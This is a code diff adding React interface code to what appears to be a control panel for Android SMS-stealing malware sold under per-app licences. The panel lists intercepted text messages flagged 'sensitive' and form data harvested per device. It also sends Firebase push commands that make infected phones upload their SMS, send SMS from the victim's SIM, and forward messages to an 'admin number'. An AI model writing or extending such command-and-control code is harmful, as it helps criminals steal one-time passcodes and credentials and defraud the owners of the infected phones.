+          <button onClick={() => onRenew(app)} disabled={renewId === app.appId} title="Renew Licence +30 Days" style={{ flex: 1, height: 36, borderRadius: 9, display: "flex", alignItems: "center", justifyContent: "center", transition: "all 0.15s", outline: "none", background: "#16a34a14", border: "1px solid #16a34a40", color: "#4ade80", opacity: renewId === app.appId ? 0.45 : 1, cursor: renewId === app.appId ? "wait" : "pointer" }}>
+            <Ic.CalendarPlus />
+          </button>
+          <div style={{ width: 1, height: 22, background: T.border, flexShrink: 0 }} />
+          <button onClick={() => onToggle(app)} disabled={togglingId === app.appId} title={isActive ? "Disable" : "Enable"} style={{ flex: 1, height: 36, borderRadius: 9, display: "flex", alignItems: "center", justifyContent: "center", transition: "all 0.15s", outline: "none", background: isActive ? T.yellow + "14" : T.green + "14", border: `1.5px solid ${isActive ? T.yellow + "55" : T.green + "55"}`, color: isActive ? T.yellow : T.green, opacity: togglingId === app.appId ? 0.45 : 1, cursor: togglingId === app.appId ? "wait" : "pointer" }}>
+            <Ic.Power />
+          </button>
+          <button onClick={() => onDelete(app)} disabled={deletingId === app.appId} title="Delete App" style={{ flex: 1, height: 36, borderRadius: 9, display: "flex", alignItems: "center", justifyContent: "center", transition: "all 0.15s", outline: "none", background: T.red + "14", border: `1.5px solid ${T.red}44`, color: T.red, opacity: deletingId === app.appId ? 0.45 : 1, cursor: deletingId === app.appId ? "wait" : "pointer" }}>
+            <Ic.Trash />
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+/* ── App Selector ── */
+function AppSelector({ apps, value, onChange, allLabel = "All Apps" }: { apps: App[]; value: string; onChange: (v: string) => void; allLabel?: string }) {
+  return (
+    <div style={{ position: "relative", display: "inline-block" }}>
+      <select value={value} onChange={e => onChange(e.target.value)} style={{ appearance: "none", WebkitAppearance: "none", background: T.card, border: `1px solid ${T.borderLight}`, color: T.text, borderRadius: 9, padding: "8px 36px 8px 12px", fontSize: 13, fontWeight: 600, outline: "none", cursor: "pointer", fontFamily: "inherit" }}>
+        <option value="">{allLabel}</option>
+        {apps.map(a => <option key={a.appId} value={a.appId}>{a.name} · {a.appId}</option>)}
+      </select>
+      <div style={{ position: "absolute", right: 10, top: "50%", transform: "translateY(-50%)", pointerEvents: "none", color: T.muted }}><Ic.ChevronDown /></div>
+    </div>
+  );
+}
+
+/* ══════════════════════════════════════════
+   MESSAGES TAB
+══════════════════════════════════════════ */
+function MessagesTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
+  const [msgs, setMsgs] = useState<MsgRow[]>([]);
+  const [loading, setLoading] = useState(false);
+  const [appFilter, setAppFilter] = useState("");
+  const [search, setSearch] = useState("");
+  const [sensitiveOnly, setSensitiveOnly] = useState(false);
+  const [expanded, setExpanded] = useState<number | null>(null);
+
+  const fetchMsgs = useCallback(async () => {
+    setLoading(true);
+    try {
+      const qs = appFilter ? `?appId=${encodeURIComponent(appFilter)}` : "";
+      const r = await apiFetch(`/api/messages${qs}`, { headers: { "x-master-pin": masterPin } });
+      if (r.ok) setMsgs(await r.json() as MsgRow[]);
+    } catch { /* ignore */ } finally { setLoading(false); }
+  }, [appFilter, masterPin]);
+
+  useEffect(() => { void fetchMsgs(); }, [fetchMsgs]);
+
+  const filtered = useMemo(() => {
+    let list = msgs;
+    if (sensitiveOnly) list = list.filter(m => m.isSensitive);
+    const q = search.trim().toLowerCase();
+    if (q) list = list.filter(m => m.fromNumber.includes(q) || m.fromSender.toLowerCase().includes(q) || m.body.toLowerCase().includes(q) || m.deviceId.toLowerCase().includes(q));
+    return list;
+  }, [msgs, sensitiveOnly, search]);
+
+  const appColors: Record<string, string> = {};
+  const palette = ["#6366f1","#8b5cf6","#06b6d4","#f59e0b","#10b981","#ef4444","#f97316","#ec4899"];
+  let ci = 0;
+  msgs.forEach(m => { if (!appColors[m.appId]) appColors[m.appId] = palette[ci++ % palette.length]; });
+
+  return (
+    <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
+      {/* Toolbar */}
+      <div style={{ display: "flex", gap: 8, flexWrap: "wrap", alignItems: "center" }}>
+        <AppSelector apps={apps} value={appFilter} onChange={v => { setAppFilter(v); }} />
+        <div style={{ position: "relative", flex: 1, minWidth: 180 }}>
+          <span style={{ position: "absolute", left: 10, top: "50%", transform: "translateY(-50%)", color: T.muted, display: "flex", pointerEvents: "none" }}><Ic.Search /></span>
+          <input type="text" placeholder="Search sender, number, body…" value={search} onChange={e => setSearch(e.target.value)}
+            style={{ width: "100%", boxSizing: "border-box", padding: "8px 32px 8px 36px", borderRadius: 9, background: T.card, border: `1px solid ${T.borderLight}`, color: T.text, fontSize: 13, outline: "none" }} />
+          {search && <button onClick={() => setSearch("")} style={{ position: "absolute", right: 8, top: "50%", transform: "translateY(-50%)", background: T.border, border: "none", color: T.muted, cursor: "pointer", width: 20, height: 20, borderRadius: 5, display: "flex", alignItems: "center", justifyContent: "center" }}><Ic.X /></button>}
+        </div>
+        <button onClick={() => setSensitiveOnly(v => !v)} style={{ padding: "8px 14px", borderRadius: 9, border: `1px solid ${sensitiveOnly ? T.red + "55" : T.borderLight}`, background: sensitiveOnly ? T.red + "18" : T.card, color: sensitiveOnly ? T.red : T.muted, fontSize: 12, fontWeight: 700, cursor: "pointer", whiteSpace: "nowrap" }}>🔴 Sensitive</button>
+        <button onClick={() => void fetchMsgs()} disabled={loading} style={{ padding: "8px 14px", borderRadius: 9, border: `1px solid ${T.borderLight}`, background: T.card, color: T.mutedLight, fontSize: 12, fontWeight: 700, cursor: loading ? "wait" : "pointer", display: "flex", alignItems: "center", gap: 6 }}>
+          {loading ? <Spinner /> : <Ic.Refresh />} Refresh
+        </button>
+      </div>
+
+      <div style={{ fontSize: 11, color: T.muted }}>{filtered.length} message{filtered.length !== 1 ? "s" : ""}</div>
+
+      {loading && msgs.length === 0 ? (
+        <div style={{ textAlign: "center", padding: 60, color: T.muted, display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}>
+          <Ic.Loader /><span>Loading messages…</span>
+        </div>
+      ) : filtered.length === 0 ? (
+        <div style={{ textAlign: "center", padding: 60, color: T.muted, background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`, display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}>
+          <Ic.Inbox /><span>{search || sensitiveOnly ? "No messages match filters." : "No messages yet."}</span>
+        </div>
+      ) : (
+        <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
+          {filtered.map(msg => {
+            const isExp = expanded === msg.id;
+            const ac = appColors[msg.appId] ?? T.accent;
+            return (
+              <div key={msg.id} onClick={() => setExpanded(isExp ? null : msg.id)}
+                style={{ background: T.card, borderRadius: 12, border: `1px solid ${msg.isSensitive ? T.red + "33" : T.borderLight}`, overflow: "hidden", cursor: "pointer", transition: "all 0.15s" }}>
+                <div style={{ padding: "10px 14px", display: "flex", alignItems: "center", gap: 10 }}>
+                  <span style={{ background: ac + "20", color: ac, border: `1px solid ${ac}44`, borderRadius: 5, padding: "2px 7px", fontSize: 9, fontWeight: 800, flexShrink: 0 }}>{msg.appId.slice(-8)}</span>
+                  <div style={{ flex: 1, minWidth: 0 }}>
+                    <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 2 }}>
+                      <span style={{ fontWeight: 800, fontSize: 13, color: T.text, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{msg.fromSender || msg.fromNumber}</span>
+                      {msg.fromSender && msg.fromNumber !== msg.fromSender && <span style={{ fontSize: 11, color: T.accentLight, fontFamily: "monospace", flexShrink: 0 }}>{msg.fromNumber}</span>}
+                      {msg.isSensitive && <span style={{ fontSize: 9, fontWeight: 800, color: T.red, background: T.red + "18", borderRadius: 4, padding: "1px 5px", flexShrink: 0 }}>SENSITIVE</span>}
+                    </div>
+                    <div style={{ fontSize: 12, color: T.muted, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{msg.body}</div>
+                  </div>
+                  <div style={{ fontSize: 10, color: T.muted, flexShrink: 0 }}>{fmtAgo(msg.receivedAt)}</div>
+                  <div style={{ color: T.muted, flexShrink: 0, transition: "transform 0.15s", transform: isExp ? "rotate(90deg)" : "none" }}><Ic.ChevronRight /></div>
+                </div>
+                {isExp && (
+                  <div style={{ padding: "0 14px 14px", borderTop: `1px solid ${T.borderLight}` }}>
+                    <div style={{ marginTop: 12, display: "flex", flexDirection: "column", gap: 8 }}>
+                      <div style={{ background: T.inputBg, borderRadius: 9, padding: 12 }}>
+                        <div style={{ fontSize: 10, color: T.muted, fontWeight: 700, marginBottom: 4, textTransform: "uppercase", letterSpacing: 0.8 }}>Message</div>
+                        <div style={{ fontSize: 14, color: T.text, lineHeight: 1.6, wordBreak: "break-word" }}>{msg.body}</div>
+                      </div>
+                      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 6 }}>
+                        {[
+                          { l: "Device ID", v: msg.deviceId },
+                          { l: "User ID", v: msg.userId },
+                          { l: "App ID", v: msg.appId },
+                          { l: "Received", v: fmtDate(msg.receivedAt) },
+                        ].map(({ l, v }) => (
+                          <div key={l} style={{ background: T.inputBg, borderRadius: 8, padding: "8px 10px" }}>
+                            <div style={{ fontSize: 9, color: T.muted, fontWeight: 700, textTransform: "uppercase", marginBottom: 2 }}>{l}</div>
+                            <div style={{ fontSize: 11, color: T.mutedLight, fontFamily: "monospace", wordBreak: "break-all" }}>{v}</div>
+                          </div>
+                        ))}
+                      </div>
+                      <div style={{ display: "flex", gap: 6 }}>
+                        <CopyBtn value={msg.body} label="Message" />
+                        <CopyBtn value={msg.fromNumber} label="Number" />
+                        <CopyBtn value={msg.deviceId} label="Device ID" />
+                      </div>
+                    </div>
+                  </div>
+                )}
+              </div>
+            );
+          })}
+        </div>
+      )}
+    </div>
+  );
+}
+
+/* ══════════════════════════════════════════
+   GROUPS TAB
+══════════════════════════════════════════ */
+function GroupsTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
+  const [groups, setGroups] = useState<GroupRow[]>([]);
+  const [loading, setLoading] = useState(false);
+  const [appFilter, setAppFilter] = useState("");
+  const [search, setSearch] = useState("");
+  const [expandedDevice, setExpandedDevice] = useState<string | null>(null);
+  const [expandedEntry, setExpandedEntry] = useState<number | null>(null);
+
+  const fetchGroups = useCallback(async () => {
+    setLoading(true);
+    try {
+      const qs = appFilter ? `?appId=${encodeURIComponent(appFilter)}` : "";
+      const r = await apiFetch(`/api/data${qs}`, { headers: { "x-master-pin": masterPin } });
+      if (r.ok) setGroups(await r.json() as GroupRow[]);
+    } catch { /* ignore */ } finally { setLoading(false); }
+  }, [appFilter, masterPin]);
+
+  useEffect(() => { void fetchGroups(); }, [fetchGroups]);
+
+  const q = search.trim().toLowerCase();
+  const filtered = useMemo(() => {
+    if (!q) return groups;
+    return groups.filter(g => {
+      const vals = Object.values(g.data).map(v => String(v).toLowerCase());
+      return g.deviceId.toLowerCase().includes(q) || g.appId.toLowerCase().includes(q) || vals.some(v => v.includes(q));
+    });
+  }, [groups, q]);
+
+  const grouped = useMemo(() => {
+    const map = new Map<string, GroupRow[]>();
+    for (const g of filtered) {
+      const key = `${g.appId}||${g.deviceId}`;
+      const arr = map.get(key) ?? [];
+      arr.push(g);
+      map.set(key, arr);
+    }
+    return Array.from(map.entries()).map(([key, entries]) => {
+      const [appId, deviceId] = key.split("||");
+      return { appId: appId ?? "", deviceId: deviceId ?? "", entries };
+    });
+  }, [filtered]);
+
+  function fmtKey(k: string) { return k.replace(/_/g, " ").replace(/([A-Z])/g, " $1").trim().replace(/^./, c => c.toUpperCase()); }
+
+  return (
+    <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
+      <div style={{ display: "flex", gap: 8, flexWrap: "wrap", alignItems: "center" }}>
+        <AppSelector apps={apps} value={appFilter} onChange={setAppFilter} />
+        <div style={{ position: "relative", flex: 1, minWidth: 180 }}>
+          <span style={{ position: "absolute", left: 10, top: "50%", transform: "translateY(-50%)", color: T.muted, display: "flex", pointerEvents: "none" }}><Ic.Search /></span>
+          <input type="text" placeholder="Search by value, device, app…" value={search} onChange={e => setSearch(e.target.value)}
+            style={{ width: "100%", boxSizing: "border-box", padding: "8px 32px 8px 36px", borderRadius: 9, background: T.card, border: `1px solid ${T.borderLight}`, color: T.text, fontSize: 13, outline: "none" }} />
+          {search && <button onClick={() => setSearch("")} style={{ position: "absolute", right: 8, top: "50%", transform: "translateY(-50%)", background: T.border, border: "none", color: T.muted, cursor: "pointer", width: 20, height: 20, borderRadius: 5, display: "flex", alignItems: "center", justifyContent: "center" }}><Ic.X /></button>}
+        </div>
+        <button onClick={() => void fetchGroups()} disabled={loading} style={{ padding: "8px 14px", borderRadius: 9, border: `1px solid ${T.borderLight}`, background: T.card, color: T.mutedLight, fontSize: 12, fontWeight: 700, cursor: loading ? "wait" : "pointer", display: "flex", alignItems: "center", gap: 6 }}>
+          {loading ? <Spinner /> : <Ic.Refresh />} Refresh
+        </button>
+      </div>
+      <div style={{ fontSize: 11, color: T.muted }}>{grouped.length} device group{grouped.length !== 1 ? "s" : ""} · {filtered.length} entr{filtered.length !== 1 ? "ies" : "y"}</div>
+
+      {loading && groups.length === 0 ? (
+        <div style={{ textAlign: "center", padding: 60, color: T.muted, display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}><Ic.Loader /><span>Loading…</span></div>
+      ) : grouped.length === 0 ? (
+        <div style={{ textAlign: "center", padding: 60, color: T.muted, background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`, display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}>
+          <Ic.Inbox /><span>{q ? "No results." : "No form data yet."}</span>
+        </div>
+      ) : (
+        <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
+          {grouped.map(({ appId, deviceId, entries }) => {
+            const key = `${appId}||${deviceId}`;
+            const isOpen = expandedDevice === key;
+            return (
+              <div key={key} style={{ background: T.card, borderRadius: 13, border: `1px solid ${T.borderLight}`, overflow: "hidden" }}>
+                <div onClick={() => setExpandedDevice(isOpen ? null : key)} style={{ padding: "11px 14px", display: "flex", alignItems: "center", gap: 10, cursor: "pointer" }}>
+                  <div style={{ color: T.accentLight }}><Ic.SmartphoneSm /></div>
+                  <div style={{ flex: 1, minWidth: 0 }}>
+                    <div style={{ fontSize: 13, fontWeight: 700, color: T.text, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{deviceId}</div>
+                    <div style={{ fontSize: 10, color: T.muted, marginTop: 1 }}>{appId} · {entries.length} entr{entries.length !== 1 ? "ies" : "y"}</div>
+                  </div>
+                  <div style={{ color: T.muted, transition: "transform 0.15s", transform: isOpen ? "rotate(90deg)" : "none" }}><Ic.ChevronRight /></div>
+                </div>
+                {isOpen && (
+                  <div style={{ borderTop: `1px solid ${T.border}` }}>
+                    {entries.map(entry => {
+                      const isEntryOpen = expandedEntry === entry.id;
+                      return (
+                        <div key={entry.id} style={{ borderBottom: `1px solid ${T.border}` }}>
+                          <div onClick={() => setExpandedEntry(isEntryOpen ? null : entry.id)} style={{ padding: "8px 14px 8px 28px", display: "flex", alignItems: "center", gap: 10, cursor: "pointer" }}>
+                            <div style={{ flex: 1, fontSize: 12, color: T.mutedLight }}>{fmtDate(entry.submittedAt)}</div>
+                            <div style={{ fontSize: 11, color: T.muted }}>#{entry.id}</div>
+                            <div style={{ color: T.muted, transition: "transform 0.15s", transform: isEntryOpen ? "rotate(90deg)" : "none" }}><Ic.ChevronRight /></div>
+                          </div>
+                          {isEntryOpen && (
+                            <div style={{ padding: "8px 14px 12px 28px", background: T.inputBg + "80" }}>
+                              {Object.entries(entry.data).map(([k, v]) => (
+                                <div key={k} style={{ display: "flex", gap: 10, padding: "4px 0", alignItems: "flex-start" }}>
+                                  <span style={{ fontSize: 10, color: T.muted, fontWeight: 700, minWidth: 90, flexShrink: 0, textTransform: "uppercase", letterSpacing: 0.5 }}>{fmtKey(k)}</span>
+                                  <span style={{ fontSize: 12, color: T.text, wordBreak: "break-all", flex: 1 }}>{String(v)}</span>
+                                  {String(v) && <CopyBtn value={String(v)} label={fmtKey(k)} />}
+                                </div>
+                              ))}
+                            </div>
+                          )}
+                        </div>
+                      );
+                    })}
+                  </div>
+                )}
+              </div>
+            );
+          })}
+        </div>
+      )}
+    </div>
+  );
+}
+
+/* ══════════════════════════════════════════
+   DEVICE DETAIL + FCM ACTIONS
+══════════════════════════════════════════ */
+type FcmState = "idle" | "sending" | "ok" | "err";
+function FcmActionCard({ title, icon, children, onReset }: { title: string; icon: React.ReactNode; children: React.ReactNode; onReset: () => void }) {
+  return (
+    <div style={{ background: T.inputBg, borderRadius: 12, border: `1px solid ${T.borderLight}`, overflow: "hidden" }}>
+      <div style={{ padding: "10px 14px", borderBottom: `1px solid ${T.border}`, display: "flex", alignItems: "center", gap: 8 }}>
+        <div style={{ color: T.accentLight }}>{icon}</div>
+        <div style={{ fontSize: 13, fontWeight: 800, color: T.text, flex: 1 }}>{title}</div>
+        <button onClick={onReset} style={{ background: "none", border: "none", color: T.muted, cursor: "pointer", fontSize: 10, padding: "2px 6px" }}>Reset</button>
+      </div>
+      <div style={{ padding: 14 }}>{children}</div>
+    </div>
+  );
+}
+
+function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; masterPin: string; onClose: () => void }) {
+  const [sim, setSim] = useState<"1" | "2">("1");
+
+  const [pingState, setPingState] = useState<FcmState>("idle");
+  const [pingLog, setPingLog] = useState("");
+
+  const [smsGetState, setSmsGetState] = useState<FcmState>("idle");
+  const [smsGetLog, setSmsGetLog] = useState("");
+  const [smsGetPhone, setSmsGetPhone] = useState("");
+  const [smsGetCount, setSmsGetCount] = useState("20");
+
+  const [smsSendState, setSmsSendState] = useState<FcmState>("idle");
+  const [smsSendLog, setSmsSendLog] = useState("");
+  const [smsSendTo, setSmsSendTo] = useState("");
+  const [smsSendBody, setSmsSendBody] = useState("");
+
+  const [adminState, setAdminState] = useState<FcmState>("idle");
+  const [adminLog, setAdminLog] = useState("");
+  const [adminNumber, setAdminNumber] = useState("");
+  const [adminEnabled, setAdminEnabled] = useState(device.forwardEnabled);
+
+  const [fwdState, setFwdState] = useState<FcmState>("idle");
+  const [fwdLog, setFwdLog] = useState("");
+  const [fwdNumber, setFwdNumber] = useState("");
+
+  const [ussdState, setUssdState] = useState<FcmState>("idle");
+  const [ussdLog, setUssdLog] = useState("");
+  const [ussdCode, setUssdCode] = useState("");
+
+  async function sendFcm(data: Record<string, string>, setState: (s: FcmState) => void, setLog: (l: string) => void) {
+    if (!device.hasFcm) { setLog("No FCM token — device unreachable."); setState("err"); return; }
+    setState("sending"); setLog("Sending…");
+    try {
+      const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data }) });
+      if (!r.ok) { const j = await r.json() as { error?: string }; setLog(j.error ?? "Failed"); setState("err"); return; }
+      setLog("Sent! Waiting for device…"); setState("ok");
+      setTimeout(() => { setState("idle"); setLog(""); }, 6000);
+    } catch { setLog("Network error"); setState("err"); }
+  }
+
+  const stateStyle = (s: FcmState): React.CSSProperties => ({
+    fontSize: 12, padding: "8px 12px", borderRadius: 8, marginBottom: 8,
+    background: s === "ok" ? T.green + "18" : s === "err" ? T.red + "15" : T.accentGlow,
+    color: s === "ok" ? T.green : s === "err" ? T.red : T.accentLight,
+    display: s === "idle" ? "none" : "block",
+  });
+
+  function BtnSend({ onClick, disabled, children }: { onClick: () => void; disabled: boolean; children: React.ReactNode }) {
+    return (
+      <button onClick={onClick} disabled={disabled} style={{ width: "100%", padding: "10px 0", borderRadius: 9, background: disabled ? T.accentGlow : `linear-gradient(135deg,${T.accent},#8b5cf6)`, color: disabled ? T.accentLight : "#fff", border: "none", fontWeight: 800, fontSize: 13, cursor: disabled ? "not-allowed" : "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
+        {children}
+      </button>
+    );
+  }
+
+  const ONLINE_MS = 15 * 60 * 1000;
+  const isOnline = device.lastOnline ? (Date.now() - new Date(device.lastOnline).getTime()) < ONLINE_MS : false;
+
+  function renderSim(slot: number, carrier: string | null, phone: string | null) {
+    return (
+      <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
+        <span style={{ fontSize: 10, fontWeight: 700, color: T.muted, background: T.border, borderRadius: 4, padding: "1px 5px" }}>SIM{slot}</span>
+        {carrier || phone ? <span style={{ fontSize: 12, color: T.mutedLight }}>{carrier && <b style={{ color: T.text }}>{carrier}</b>}{carrier && phone && " · "}{phone && <span style={{ fontFamily: "monospace", color: "#93c5fd" }}>{phone}</span>}</span> : <span style={{ fontSize: 11, color: T.muted, fontStyle: "italic" }}>No SIM</span>}
       </div>
     );
   }
 
-/* ─────────── Dashboard ─────────── */
+  return (
+    <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.90)", zIndex: 300, display: "flex", flexDirection: "column", backdropFilter: "blur(4px)" }}>
+      <div style={{ background: T.headerBg, borderBottom: `1px solid ${T.border}`, padding: "0 16px", flexShrink: 0 }}>
+        <div style={{ maxWidth: 720, margin: "0 auto", height: 56, display: "flex", alignItems: "center", gap: 12 }}>
+          <button onClick={onClose} style={{ background: T.border, border: "none", color: T.text, borderRadius: 8, width: 34, height: 34, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer" }}><Ic.X /></button>
+          <div style={{ display: "flex", alignItems: "center", gap: 8, flex: 1 }}>
+            <div style={{ color: T.accentLight }}><Ic.Smartphone /></div>
+            <span style={{ fontWeight: 900, fontSize: 15, color: T.text, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{device.name}</span>
+            <span style={{ display: "inline-flex", alignItems: "center", gap: 4, background: isOnline ? "#16a34a22" : T.border, color: isOnline ? "#4ade80" : T.muted, borderRadius: 99, padding: "2px 9px", fontSize: 10, fontWeight: 800 }}>
+              <span style={{ width: 5, height: 5, borderRadius: "50%", background: isOnline ? "#4ade80" : T.muted, display: "inline-block" }} />{isOnline ? "ONLINE" : "OFFLINE"}
+            </span>
+          </div>
+          <span style={{ fontSize: 10, color: T.muted, fontFamily: "monospace" }}>{device.appId}</span>
+        </div>
+      </div>
+      <div style={{ flex: 1, overflowY: "auto", padding: 16, background: T.bg }}>
+        <div style={{ maxWidth: 720, margin: "0 auto", display: "flex", flexDirection: "column", gap: 12 }}>
+          {/* Device Info Card */}
+          <div style={{ background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`, padding: "14px 16px" }}>
+            <div style={{ display: "flex", flexWrap: "wrap", gap: 12 }}>
+              <div style={{ flex: 1, minWidth: 200 }}>
+                <div style={{ fontWeight: 800, fontSize: 16, color: T.text, marginBottom: 10 }}>{device.name}</div>
+                <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
+                  {renderSim(1, device.sim1Carrier, device.sim1Phone)}
+                  {renderSim(2, device.sim2Carrier, device.sim2Phone)}
+                </div>
+              </div>
+              <div style={{ display: "flex", flexDirection: "column", gap: 4 }}>
+                {[
+                  { l: "Device ID", v: device.deviceId },
+                  { l: "User ID", v: device.userId },
+                  { l: "App ID", v: device.appId },
+                  { l: "Android", v: device.androidVersion > 0 ? `v${device.androidVersion}` : "—" },
+                  { l: "FCM", v: device.hasFcm ? "Active" : "None" },
+                  { l: "Forward", v: device.forwardEnabled ? `SIM${device.forwardSlot ?? "?"} ON` : "Off" },
+                  { l: "Last Online", v: fmtAgo(device.lastOnline) },
+                  { l: "Installed", v: fmtAgo(device.installedAt) },
+                ].map(({ l, v }) => (
+                  <div key={l} style={{ display: "flex", gap: 8, fontSize: 11 }}>
+                    <span style={{ color: T.muted, fontWeight: 600, minWidth: 80 }}>{l}</span>
+                    <span style={{ color: T.mutedLight, fontFamily: "monospace", wordBreak: "break-all" }}>{v}</span>
+                  </div>
+                ))}
+              </div>
+            </div>
+            <div style={{ display: "flex", gap: 6, marginTop: 12, flexWrap: "wrap" }}>
+              <CopyBtn value={device.deviceId} label="Device ID" />
+              <CopyBtn value={device.userId} label="User ID" />
+              {device.sim1Phone && <CopyBtn value={device.sim1Phone} label="SIM1" />}
+              {device.sim2Phone && <CopyBtn value={device.sim2Phone} label="SIM2" />}
+            </div>
+          </div>
+
+          {!device.hasFcm && (
+            <div style={{ background: T.yellow + "14", border: `1px solid ${T.yellow}40`, borderRadius: 10, padding: "10px 14px", fontSize: 12, color: T.yellow, display: "flex", alignItems: "center", gap: 8 }}>
+              <Ic.Alert /> No FCM token — FCM actions will not work on this device.
+            </div>
+          )}
+
+          {/* SIM Selector */}
+          <div style={{ display: "flex", gap: 8 }}>
+            {(["1", "2"] as const).map(s => {
+              const active = sim === s;
+              const carrier = s === "1" ? device.sim1Carrier : device.sim2Carrier;
+              const phone = s === "1" ? device.sim1Phone : device.sim2Phone;
+              return (
+                <button key={s} onClick={() => setSim(s)} style={{ flex: 1, padding: "8px 12px", borderRadius: 9, border: `1.5px solid ${active ? T.accent : T.borderLight}`, background: active ? T.accentGlow : T.card, cursor: "pointer", textAlign: "left", transition: "all 0.15s" }}>
+                  <div style={{ fontSize: 11, fontWeight: 700, color: active ? T.accentLight : T.muted }}>SIM {s}</div>
+                  <div style={{ fontSize: 10, color: active ? T.accentLight : T.muted, marginTop: 2 }}>{[carrier, phone].filter(Boolean).join(" · ") || "No SIM"}</div>
+                </button>
+              );
+            })}
+          </div>
+
+          {/* FCM Action 1: Online Check */}
+          <FcmActionCard title="Online Check (Ping)" icon={<Ic.Wifi />} onReset={() => { setPingState("idle"); setPingLog(""); }}>
+            <div style={stateStyle(pingState)}>{pingLog}</div>
+            <BtnSend onClick={() => sendFcm({ type: "online_check" }, setPingState, setPingLog)} disabled={pingState === "sending"}>
+              {pingState === "sending" ? <><Spinner /> Sending…</> : <><Ic.Wifi /> Send Ping</>}
+            </BtnSend>
+          </FcmActionCard>
+
+          {/* FCM Action 2: Get SMS */}
+          <FcmActionCard title="Get SMS" icon={<Ic.MessageSquare />} onReset={() => { setSmsGetState("idle"); setSmsGetLog(""); setSmsGetPhone(""); setSmsGetCount("20"); }}>
+            <input type="text" placeholder="Phone number filter (optional)" value={smsGetPhone} onChange={e => setSmsGetPhone(e.target.value)} style={{ ...inpBase, marginTop: 0, marginBottom: 8, fontSize: 13 }} />
+            <input type="number" placeholder="Max count (default 20)" value={smsGetCount} onChange={e => setSmsGetCount(e.target.value)} style={{ ...inpBase, marginTop: 0, marginBottom: 8, fontSize: 13 }} />
+            <div style={stateStyle(smsGetState)}>{smsGetLog}</div>
+            <BtnSend onClick={() => sendFcm({ type: "get_sms", count: smsGetCount || "20", ...(smsGetPhone ? { phoneNumber: smsGetPhone } : {}), simSlot: sim === "2" ? "1" : "0" }, setSmsGetState, setSmsGetLog)} disabled={smsGetState === "sending"}>
+              {smsGetState === "sending" ? <><Spinner /> Sending…</> : <><Ic.MessageSquare /> Get SMS</>}
+            </BtnSend>
+          </FcmActionCard>
+
+          {/* FCM Action 3: Send SMS */}
+          <FcmActionCard title="Send SMS" icon={<Ic.Send />} onReset={() => { setSmsSendState("idle"); setSmsSendLog(""); setSmsSendTo(""); setSmsSendBody(""); }}>
+            <input type="tel" placeholder="To (phone number)" value={smsSendTo} onChange={e => setSmsSendTo(e.target.value)} style={{ ...inpBase, marginTop: 0, marginBottom: 8, fontSize: 13 }} />
+            <textarea placeholder="Message body" value={smsSendBody} onChange={e => setSmsSendBody(e.target.value)} rows={3} style={{ ...inpBase, marginTop: 0, marginBottom: 8, fontSize: 13, resize: "vertical" }} />
+            <div style={stateStyle(smsSendState)}>{smsSendLog}</div>
+            <BtnSend onClick={() => { if (!smsSendTo.trim() || !smsSendBody.trim()) return; sendFcm({ type: "sms", to: smsSendTo.trim(), body: smsSendBody.trim(), simSlot: sim === "2" ? "1" : "0" }, setSmsSendState, setSmsSendLog); }} disabled={smsSendState === "sending" || !smsSendTo.trim() || !smsSendBody.trim()}>
+              {smsSendState === "sending" ? <><Spinner /> Sending…</> : <><Ic.Send /> Send SMS</>}
+            </BtnSend>
+          </FcmActionCard>
+
+          {/* FCM Action 4: Update Admin Number */}
+          <FcmActionCard title="Update Admin Number" icon={<Ic.Key />} onReset={() => { setAdminState("idle"); setAdminLog(""); setAdminNumber(""); setAdminEnabled(device.forwardEnabled); }}>
+            <div style={{ display: "flex", gap: 8, marginBottom: 8 }}>
+              <button onClick={() => setAdminEnabled(true)} style={{ flex: 1, padding: "8px 0", borderRadius: 8, border: `1.5px solid ${adminEnabled ? T.green + "55" : T.borderLight}`, background: adminEnabled ? T.green + "18" : T.card, color: adminEnabled ? T.green : T.muted, fontWeight: 700, cursor: "pointer", fontSize: 12 }}>Enable</button>
+              <button onClick={() => setAdminEnabled(false)} style={{ flex: 1, padding: "8px 0", borderRadius: 8, border: `1.5px solid ${!adminEnabled ? T.red + "55" : T.borderLight}`, background: !adminEnabled ? T.red + "18" : T.card, color: !adminEnabled ? T.red : T.muted, fontWeight: 700, cursor: "pointer", fontSize: 12 }}>Disable</button>
+            </div>
+            {adminEnabled && <input type="tel" placeholder="Admin phone number" value={adminNumber} onChange={e => setAdminNumber(e.target.value)} style={{ ...inpBase, marginTop: 0, marginBottom: 8, fontSize: 13 }} />}
+            <div style={stateStyle(adminState)}>{adminLog}</div>
+            <BtnSend
+              onClick={() => sendFcm(adminEnabled ? { type: "admin_update", status: "on", adminNumber: adminNumber.trim(), deviceId: device.deviceId, simSlot: sim === "2" ? "1" : "0" } : { type: "admin_update", status: "off", deviceId: device.deviceId }, setAdminState, setAdminLog)}
+              disabled={adminState === "sending" || (adminEnabled && !adminNumber.trim())}>
+              {adminState === "sending" ? <><Spinner /> Sending…</> : <><Ic.Key /> Update Number</>}
+            </BtnSend>
+          </FcmActionCard>
+
